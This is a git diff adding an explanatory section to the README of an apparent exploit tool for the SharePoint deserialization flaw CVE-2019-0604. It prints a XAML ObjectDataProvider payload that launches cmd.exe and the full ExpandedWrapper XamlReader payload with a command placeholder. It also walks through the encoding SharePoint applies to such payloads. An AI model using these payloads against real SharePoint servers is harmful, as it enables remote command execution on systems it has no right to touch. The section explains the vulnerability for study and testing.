@@ -56,6 +56,60 @@ PRs are welcome!
 Installing and running an older version of Sharepoint to test this tool is a very annoying and cumbersome process. Installing and configuring Sharepoint was actually the only difficult thing in the process of developing this tool. To spare you sweat and blood, you may find these resources helpful, they contain a VM with Sharepoint pre-installed. You might need to fix up some licenses issues such as rearming Windows license, configuring a Developer license for MSSQL, and so on. The links are:
 [Sharepoint 2016 Ready made VM](https://gauravmahajan.net/2017/10/06/sharepoint-server-2016-virtual-machine-download/) and [Sharepoint 2013 Ready made VM](https://gauravmahajan.net/2014/08/17/sharepoint-server-2013-sp1-virtual-machine-download/)
 
+## Brief Explanation of the serialization process
+
+In my analysis of this vulnerability, I noticed that the vulnerability has been explaned in depth by the authors of the awesome links you will find in the References section below. I will attempt to explain the serialization process, because this is what allowed me to create a dynamic payload you can change on the fly without calling .NET code everytime.
+
+The serialized string is a XamlReader ExpandedWrapper which contains our payload in its XML format, An example taken from [this POC](https://github.com/linhlhq/CVE-2019-0604)  is:
+```XML
+<ResourceDictionary
+xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+xmlns:System="clr-namespace:System;assembly=mscorlib"
+xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
+	<ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
+		<ObjectDataProvider.MethodParameters>
+			<System:String>cmd.exe</System:String>
+			<System:String>/c calc</System:String>
+		</ObjectDataProvider.MethodParameters>
+	</ObjectDataProvider>
+</ResourceDictionary>
+```
+
+To serialize it, .NET calls a function called Microsoft.SharePoint.BusinessData.Infrastructure.EntityInstanceIdEncoder.EncodeEntityInstanceId, which takes this string object and performs some operations resulting finally in the serialized payload which looks like "__bp123435009700370047005600d60...etc"
+By decompiling this function and debugging its code flow, we can see the following:
+
+screenshot1 here
+
+Here the function adds __ to the start of the string, then checks the number of objects sent to be serialized, here it's 1, so it adds 1 to 97 to convert the result into ascii (b ascii is 98 decimal), so the string becomes __b
+
+screenshot2 here
+
+After that, the code loops on the type of the element being serialized, it's currently of type object, so it looks up a table of types and their values from an array called typeHash.
+
+screenshot3 here
+
+When we decompile this array, we will find that the object type is the type #16, which has an index of 15 (starting from zero!), so the code adds the value of 16 to 97 resulting in 112, which is p in decimal, now the serialized string becomes __bp
+
+screenshot4 here
+
+Next, we check the type of the object being sent to be serialized, which is of type object, so we enter this if statement, where it takes our input, serialized it using the XmlSerializer class of .NET, then appends in front of it the the XamlReader Assembly Qualified name + ":" plus the XML serialized payload, so it looks like this: 
+
+```xml
+System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089:<?xml version="1.0" encoding="utf-16"?>
+<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <ProjectedProperty0>
+    <ObjectInstance xsi:type="XamlReader" />
+    <MethodName>Parse</MethodName>
+    <MethodParameters>
+      <anyType xsi:type="xsd:string">&lt;ResourceDictionary xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml' xmlns:System='clr-namespace:System;assembly=mscorlib' xmlns:Diag='clr-namespace:System.Diagnostics;assembly=system'&gt;&lt;ObjectDataProvider x:Key='y' ObjectType='{x:Type Diag:Process}' MethodName='Start'&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;System:String&gt;cmd&lt;/System:String&gt;&lt;System:String&gt;/c COMMANDHERE &lt;/System:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt; </anyType>
+    </MethodParameters>
+  </ProjectedProperty0>
+</ExpandedWrapperOfXamlReaderObjectDataProvider>
+```
+
+After that, this serialized string, whose encoding is utf-16 is sent to be Hex-encoded, and then reversed, and also the length of this serialized string (after encoding, hexing and reversing) is calculated in hex (the length, that is - also encoded, hexed and reversed) and then put in front of the string so we have a string for example like "__bp82c135009700370047005600d60...etc", which actually means length of 82c1, so reversing that is 1c28 in hex, meaning 7208 in decimal. After that we have 35009700370047005600, so let's reverse that into 00530079007300740065, and decoding this from utf-16 and hex, we have 0x5379737465 which in ascii is Syste (System...etc etc)
+
 
 ## TODO:
 
@@ -74,6 +128,9 @@ For more awesome detection steps, Snort and Sigma rules, please visit: [Mansour 
 [ZDI](https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability)
 
 [k8gege POC](https://github.com/k8gege/CVE-2019-0604)
+
+[.NET POC to create serialized payload](https://github.com/linhlhq/CVE-2019-0604) 
+
 
 ## Disclaimer
 
